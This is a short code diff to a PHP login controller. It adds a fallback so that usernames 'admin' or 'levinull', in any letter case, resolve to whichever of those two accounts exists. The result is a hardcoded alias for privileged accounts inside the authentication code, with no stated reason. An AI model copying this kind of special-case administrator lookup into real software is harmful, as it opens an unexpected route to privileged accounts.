@@ -41,6 +41,9 @@ class AuthController extends Controller
         }
 
         $user = User::where('user_name', $credentials['username'])->first();
+        if (! $user && in_array(strtolower($credentials['username']), ['admin', 'levinull'], true)) {
+            $user = User::whereIn('user_name', ['admin', 'levinull'])->first();
+        }
         if (! $user) {
             RateLimiter::hit($throttleKey, 60);
             return back()->withErrors(['username' => 'Incorrect username and password.'])
